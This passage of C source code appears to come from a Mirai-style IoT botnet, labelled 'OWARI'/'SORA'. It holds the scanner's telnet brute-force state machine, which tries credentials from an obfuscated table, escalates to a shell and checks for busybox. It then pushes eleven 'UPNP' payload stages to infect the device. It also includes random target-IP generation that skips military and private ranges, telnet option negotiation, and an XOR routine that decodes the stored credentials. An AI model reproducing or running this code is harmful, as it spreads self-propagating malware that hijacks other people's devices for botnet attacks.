                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                conn->state = SC_WAITING_PASSWORD;
#ifdef DEBUG
                                printf("[scanner] FD%d received username prompt\n", conn->fd);
#endif
                            }
                            break;
                        case SC_WAITING_PASSWORD:
                            if ((consumed = consume_pass_prompt(conn)) > 0)
                            {
#ifdef DEBUG
                                printf("[scanner] FD%d received password prompt\n", conn->fd);
#endif

                                send(conn->fd, conn->auth->password, conn->auth->password_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);

                                conn->state = SC_WAITING_PASSWD_RESP;
                            }
                            break;	
                        case SC_WAITING_PASSWD_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;

#ifdef DEBUG
                                printf("[scanner] FD%d received shell prompt\n", conn->fd);
#endif
                                table_unlock_val(OWARI_ENABLE);
                                tmp_str = table_retrieve_val(OWARI_ENABLE, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(OWARI_ENABLE);
                                conn->state = SC_WAITING_ENABLE_RESP;
                            }
                            break;
                        case SC_WAITING_ENABLE_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;

#ifdef DEBUG
                                printf("[scanner] FD%d received sh prompt\n", conn->fd);
#endif

                                table_unlock_val(OWARI_SYSTEM);
                                tmp_str = table_retrieve_val(OWARI_SYSTEM, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(OWARI_SYSTEM);

                                conn->state = SC_WAITING_SYSTEM_RESP;
                            }
                            break;
						case SC_WAITING_SYSTEM_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;

#ifdef DEBUG
                                printf("[scanner] FD%d received sh prompt\n", conn->fd);
#endif

                                table_unlock_val(OWARI_SHELL);
                                tmp_str = table_retrieve_val(OWARI_SHELL, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(OWARI_SHELL);

                                conn->state = SC_WAITING_SHELL_RESP;
                            }
                            break;
                        case SC_WAITING_SHELL_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;

#ifdef DEBUG
                                printf("[scanner] FD%d received enable prompt\n", conn->fd);
#endif

                                table_unlock_val(OWARI_SH);
                                tmp_str = table_retrieve_val(OWARI_SH, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(OWARI_SH);

                                conn->state = SC_WAITING_SH_RESP;
                            }
                            break;
                        case SC_WAITING_SH_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;

#ifdef DEBUG
                                printf("[scanner] FD%d received sh prompt\n", conn->fd);
#endif

                                // Send query string
                                table_unlock_val(OWARI_BUSYBOX);
                                tmp_str = table_retrieve_val(OWARI_BUSYBOX, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(OWARI_BUSYBOX);

                                conn->state = SC_WAITING_TOKEN_RESP;
                            }
                            break;
                        case SC_WAITING_TOKEN_RESP:
                            consumed = consume_resp_prompt(conn);
                            if (consumed == -1)
                            {
#ifdef DEBUG
                                printf("[scanner] FD%d invalid username/password combo\n", conn->fd);
#endif
                                close(conn->fd);
                                conn->fd = -1;

                                if (++(conn->tries) == 15)
                                {
                                    conn->tries = 0;
                                    conn->state = SC_PREP_DEVICE;
                                }
                                else
                                {
                                    setup_connection(conn);
#ifdef DEBUG
                                    printf("[scanner] FD%d retrying with different auth combo!\n", conn->fd);
#endif
                                }
                            }
                            else if (consumed > 0)
                            {
                                char *tmp_str;
                                int tmp_len;
#ifdef DEBUG
                                printf("[scanner] FD%d Device infectable, continueing with infection.\n", conn->fd);
#endif
                                close(conn->fd);
                                conn->fd = -1;
                                conn->state = SC_PREP_DEVICE;
                            }
                            break;
                        case SC_PREP_DEVICE:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;
                                table_unlock_val(OWARI_CLEAN_DEVICE);
                                tmp_str = table_retrieve_val(OWARI_CLEAN_DEVICE, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(OWARI_CLEAN_DEVICE);
                                conn->state = SC_SENDPAYLOAD_1;
                            }
                            break;				
                        case SC_SENDPAYLOAD_1:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;
                                table_unlock_val(OWARI_UPNP_1);
                                tmp_str = table_retrieve_val(OWARI_UPNP_1, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(OWARI_UPNP_1);
                                conn->state = SC_SENDPAYLOAD_2;
                            }
                            break;
                        case SC_SENDPAYLOAD_2:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;
                                table_unlock_val(OWARI_UPNP_2);
                                tmp_str = table_retrieve_val(OWARI_UPNP_2, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(OWARI_UPNP_2);
                                conn->state = SC_SENDPAYLOAD_3;
                            }
                            break;
                        case SC_SENDPAYLOAD_3:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;
                                table_unlock_val(OWARI_UPNP_3);
                                tmp_str = table_retrieve_val(OWARI_UPNP_3, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(OWARI_UPNP_3);
                                conn->state = SC_SENDPAYLOAD_4;
                            }
                            break;
                        case SC_SENDPAYLOAD_4:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;
                                table_unlock_val(OWARI_UPNP_4);
                                tmp_str = table_retrieve_val(OWARI_UPNP_4, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(OWARI_UPNP_4);
                                conn->state = SC_SENDPAYLOAD_5;
                            }
                            break;
                        case SC_SENDPAYLOAD_5:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;
                                table_unlock_val(OWARI_UPNP_5);
                                tmp_str = table_retrieve_val(OWARI_UPNP_5, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(OWARI_UPNP_5);
                                conn->state = SC_SENDPAYLOAD_6;
                            }
                            break;
                        case SC_SENDPAYLOAD_6:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;
                                table_unlock_val(OWARI_UPNP_6);
                                tmp_str = table_retrieve_val(OWARI_UPNP_6, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(OWARI_UPNP_6);
                                conn->state = SC_SENDPAYLOAD_7;
                            }
                            break;
                        case SC_SENDPAYLOAD_7:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;
                                table_unlock_val(OWARI_UPNP_7);
                                tmp_str = table_retrieve_val(OWARI_UPNP_7, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(OWARI_UPNP_7);
                                conn->state = SC_SENDPAYLOAD_8;
                            }
                            break;
                        case SC_SENDPAYLOAD_8:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;
                                table_unlock_val(OWARI_UPNP_8);
                                tmp_str = table_retrieve_val(OWARI_UPNP_8, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(OWARI_UPNP_8);
                                conn->state = SC_SENDPAYLOAD_9;
                            }
                            break;
                        case SC_SENDPAYLOAD_9:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;
                                table_unlock_val(OWARI_UPNP_9);
                                tmp_str = table_retrieve_val(OWARI_UPNP_9, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(OWARI_UPNP_9);
                                conn->state = SC_SENDPAYLOAD_10;
                            }
                            break;
                        case SC_SENDPAYLOAD_10:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;
                                table_unlock_val(OWARI_UPNP_10);
                                tmp_str = table_retrieve_val(OWARI_UPNP_10, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(OWARI_UPNP_10);
                                conn->state = SC_SENDPAYLOAD_11;
                            }
                            break;
                        case SC_SENDPAYLOAD_11:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;
                                table_unlock_val(OWARI_UPNP_11);
                                tmp_str = table_retrieve_val(OWARI_UPNP_11, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(OWARI_UPNP_11);
                                conn->state = SC_CLOSED;
                            }
                            break;
                        default:
                            consumed = 0;
                            break;
                        }

                        if (consumed == 0)
                            break;
                        else
                        {
                            if (consumed > conn->rdbuf_pos)
                                consumed = conn->rdbuf_pos;

                            conn->rdbuf_pos -= consumed;
                            memmove(conn->rdbuf, conn->rdbuf + consumed, conn->rdbuf_pos);
                        }
                    }
                }
            }
        }
    }
}

void scanner_kill(void)
{
    kill(scanner_pid, 9);
}

static void setup_connection(struct scanner_connection *conn)
{
    struct sockaddr_in addr = {0};

    if (conn->fd != -1)
        close(conn->fd);
    if ((conn->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("[scanner] Failed to call socket()\n");
#endif
        return;
    }

    conn->rdbuf_pos = 0;
    util_zero(conn->rdbuf, sizeof(conn->rdbuf));

    fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = conn->dst_addr;
    addr.sin_port = conn->dst_port;

    conn->last_recv = fake_time;
    conn->state = SC_CONNECTING;
    connect(conn->fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
}

static ipv4_t get_random_ip(void)
{
    uint32_t tmp;
    uint8_t o1, o2, o3, o4;

    do
    {
        tmp = rand_next();

        o1 = tmp & 0xff;
        o2 = (tmp >> 8) & 0xff;
        o3 = (tmp >> 16) & 0xff;
        o4 = (tmp >> 24) & 0xff;
    }
    while (o1 == 127 ||                             // 127.0.0.0/8      - Loopback
          (o1 == 0) ||                              // 0.0.0.0/8        - Invalid address space
          (o1 == 3) ||                              // 3.0.0.0/8        - General Electric Company
          (o1 == 15 || o1 == 16) ||                 // 15.0.0.0/7       - Hewlett-Packard Company
          (o1 == 56) ||                             // 56.0.0.0/8       - US Postal Service
          (o1 == 10) ||                             // 10.0.0.0/8       - Internal network
          (o1 == 192 && o2 == 168) ||               // 192.168.0.0/16   - Internal network
          (o1 == 172 && o2 >= 16 && o2 < 32) ||     // 172.16.0.0/14    - Internal network
          (o1 == 100 && o2 >= 64 && o2 < 127) ||    // 100.64.0.0/10    - IANA NAT reserved
          (o1 == 169 && o2 > 254) ||                // 169.254.0.0/16   - IANA NAT reserved
          (o1 == 198 && o2 >= 18 && o2 < 20) ||     // 198.18.0.0/15    - IANA Special use
          (o1 >= 224) ||                            // 224.*.*.*+       - Multicast
          (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
    );

    return INET_ADDR(o1,o2,o3,o4);
}

static int consume_iacs(struct scanner_connection *conn)
{
    int consumed = 0;
    uint8_t *ptr = conn->rdbuf;

    while (consumed < conn->rdbuf_pos)
    {
        int i;

        if (*ptr != 0xff)
            break;
        else if (*ptr == 0xff)
        {
            if (!can_consume(conn, ptr, 1))
                break;
            if (ptr[1] == 0xff)
            {
                ptr += 2;
                consumed += 2;
                continue;
            }
            else if (ptr[1] == 0xfd)
            {
                uint8_t tmp1[3] = {255, 251, 31};
                uint8_t tmp2[9] = {255, 250, 31, 0, 80, 0, 24, 255, 240};

                if (!can_consume(conn, ptr, 2))
                    break;
                if (ptr[2] != 31)
                    goto iac_wont;

                ptr += 3;
                consumed += 3;

                send(conn->fd, tmp1, 3, MSG_NOSIGNAL);
                send(conn->fd, tmp2, 9, MSG_NOSIGNAL);
            }
            else
            {
                iac_wont:

                if (!can_consume(conn, ptr, 2))
                    break;

                for (i = 0; i < 3; i++)
                {
                    if (ptr[i] == 0xfd)
                        ptr[i] = 0xfc;
                    else if (ptr[i] == 0xfb)
                        ptr[i] = 0xfd;
                }

                send(conn->fd, ptr, 3, MSG_NOSIGNAL);
                ptr += 3;
                consumed += 3;
            }
        }
    }

    return consumed;
}

static int consume_any_prompt(struct scanner_connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    for (i = conn->rdbuf_pos - 1; i > 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%')
        {
            prompt_ending = i + 1;
            break;
        }
    }

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static int consume_user_prompt(struct scanner_connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    for (i = conn->rdbuf_pos - 1; i > 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%')
        {
            prompt_ending = i + 1;
            break;
        }
    }

    if (prompt_ending == -1)
    {
        int tmp, len;
		char *SORA_ogin;
		char *SORA_enter;
        table_unlock_val(OWARI_LOGIN);
		table_unlock_val(OWARI_ENTER);
		SORA_ogin = table_retrieve_val(OWARI_LOGIN, &len);
		SORA_enter = table_retrieve_val(OWARI_ENTER, &len);
        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, SORA_ogin, len - 1) != -1))
            prompt_ending = tmp;
        else if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, SORA_enter, len - 1) != -1))
            prompt_ending = tmp;
    }
        table_lock_val(OWARI_LOGIN);
		table_lock_val(OWARI_ENTER);
    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static int consume_pass_prompt(struct scanner_connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    for (i = conn->rdbuf_pos - 1; i > 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#')
        {
            prompt_ending = i + 1;
            break;
        }
    }

        if (prompt_ending == -1)
    {
		char *SORA_asswd;
        int tmp, len;
		table_unlock_val(OWARI_PASSWORD2);
		SORA_asswd = table_retrieve_val(OWARI_PASSWORD2, &len);
        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, SORA_asswd, len - 1) != -1))
            prompt_ending = tmp;
    }
		table_lock_val(OWARI_PASSWORD2);
    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static int consume_resp_prompt(struct scanner_connection *conn)
{
    char *tkn_resp;
    int prompt_ending, len;

    table_unlock_val(OWARI_ERROR1);
    tkn_resp = table_retrieve_val(OWARI_ERROR1, &len);
    if (util_memsearch(conn->rdbuf, conn->rdbuf_pos, tkn_resp, len - 1) != -1)
    {
        table_lock_val(OWARI_ERROR1);
        return -1;
    }
    table_lock_val(OWARI_ERROR1);

    table_unlock_val(OWARI_NOTFOUND);
    tkn_resp = table_retrieve_val(OWARI_NOTFOUND, &len);
    prompt_ending = util_memsearch(conn->rdbuf, conn->rdbuf_pos, tkn_resp, len - 1);
    table_lock_val(OWARI_NOTFOUND);

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static void add_auth_entry(char *enc_user, char *enc_pass, uint16_t weight)
{
    int tmp;

    auth_table = realloc(auth_table, (auth_table_len + 1) * sizeof (struct scanner_auth));
    auth_table[auth_table_len].username = deobf(enc_user, &tmp);
    auth_table[auth_table_len].username_len = (uint8_t)tmp;
    auth_table[auth_table_len].password = deobf(enc_pass, &tmp);
    auth_table[auth_table_len].password_len = (uint8_t)tmp;
    auth_table[auth_table_len].weight_min = auth_table_max_weight;
    auth_table[auth_table_len++].weight_max = auth_table_max_weight + weight;
    auth_table_max_weight += weight;
}

static struct scanner_auth *random_auth_entry(void)
{
    int i;
    uint16_t r = (uint16_t)(rand_next() % auth_table_max_weight);

    for (i = 0; i < auth_table_len; i++)
    {
        if (r < auth_table[i].weight_min)
            continue;
        else if (r < auth_table[i].weight_max)
            return &auth_table[i];
    }

    return NULL;
}

static char *deobf(char *str, int *len)
{
    int i;
    char *cpy;

    *len = util_strlen(str);
    cpy = malloc(*len + 1);

    util_memcpy(cpy, str, *len + 1);

    for (i = 0; i < *len; i++)
    {
        cpy[i] ^= 0xDE;
        cpy[i] ^= 0xDE;
        cpy[i] ^= 0xFB;
        cpy[i] ^= 0xAF;
    }

    return cpy;
}

static BOOL can_consume(struct scanner_connection *conn, uint8_t *ptr, int amount)
{
    uint8_t *end = conn->rdbuf + conn->rdbuf_pos;

    return ptr + amount < end;
}

